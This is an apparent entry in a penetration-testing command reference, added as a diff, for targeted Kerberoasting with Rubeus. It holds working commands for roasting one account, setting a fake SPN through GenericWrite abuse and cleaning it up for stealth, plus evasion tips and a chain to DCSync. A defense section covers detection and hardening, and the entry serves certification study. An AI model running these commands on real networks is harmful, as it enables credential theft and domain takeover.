@@ -1,0 +1,88 @@
+{
+  "id": "ad-rubeus-kerberoast-user",
+  "name": "Rubeus - Kerberoast Single User",
+  "command": ".\\Rubeus.exe kerberoast /user:<user> /nowrap",
+  "description": "Roasts one specific SPN account — used for targeted Kerberoasting (after setting a fake SPN via GenericWrite ACL abuse) or to quietly pick off a single high-value service account. Generates only one Event 4769 vs. one per SPN in bulk mode.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Password Attacks",
+  "subcategory": "Kerberoasting",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "kerberoasting",
+    "targeted",
+    "rubeus",
+    "windows",
+    "acl-abuse"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== TWO USE CASES FOR TARGETED KERBEROASTING ===\n\n1. PICKING OFF A SPECIFIC HIGH-VALUE ACCOUNT\n   You know sqlsvc is a Domain Admin with a likely-weak password.\n   Roast just that one account to minimize Event 4769 logs:\n   .\\Rubeus.exe kerberoast /user:sqlsvc /nowrap\n\n2. TARGETED KERBEROASTING VIA GENERICWRITE (ACL ABUSE CHAIN) ===\n   If you have GenericWrite over an account (adunn), you can SET a fake SPN\n   on that account, making it Kerberoastable even if it wasn't before:\n\n   Step 1 — Set fake SPN on victim account:\n     Set-DomainObject -Credential $Cred2 -Identity adunn\n       -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\n   Step 2 — Roast the now-kerberoastable account:\n     .\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n   Step 3 — Clean up (critical for stealth):\n     Set-DomainObject -Credential $Cred2 -Identity adunn\n       -Clear serviceprincipalname -Verbose\n\n   This is the GenericWrite → Kerberoast → Crack chain that chains into DCSync\n   if the target account (adunn) has DCSync rights.\n\n=== WHY THIS CHAINS TO DCSYNC ===\nIf adunn has Replication-Get-Changes + Replication-Get-Changes-All rights on the\ndomain object (often via ACL inheritance), cracking adunn's password lets you\nrun secretsdump.py as adunn to dump the entire NTDS.dit.",
+  "examples": [
+    {
+      "label": "Roast a single high-value account",
+      "command": ".\\Rubeus.exe kerberoast /user:sqlsvc /nowrap"
+    },
+    {
+      "label": "Set fake SPN for targeted Kerberoasting (requires GenericWrite)",
+      "command": "Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose"
+    },
+    {
+      "label": "Roast the target with fake SPN",
+      "command": ".\\Rubeus.exe kerberoast /user:adunn /nowrap"
+    },
+    {
+      "label": "Clean up fake SPN after roasting",
+      "command": "Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rubeus (GhostPack)",
+      "url": "https://github.com/GhostPack/Rubeus"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-kerberoast-crack",
+      "rel": "next",
+      "note": "Crack the roasted hashes."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Rubeus kerberoast /user:<name> targets a single high-value SPN account, minimising ticket requests.",
+    "prerequisites": "A domain context on Windows and a chosen target SPN account.",
+    "impact": "A crackable TGS hash for one specific service account.",
+    "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition. A single targeted 4769 is quieter than a bulk roast but still RC4-flaggable.",
+    "artifacts": "A single 4769 request; the hash; Rubeus execution.",
+    "prevention": "Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.",
+    "evasion": "Targeting one account avoids the bulk-request signature; /rc4opsec forces a crackable RC4 ticket.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+  },
+  "tools": [
+    "Rubeus"
+  ]
+}
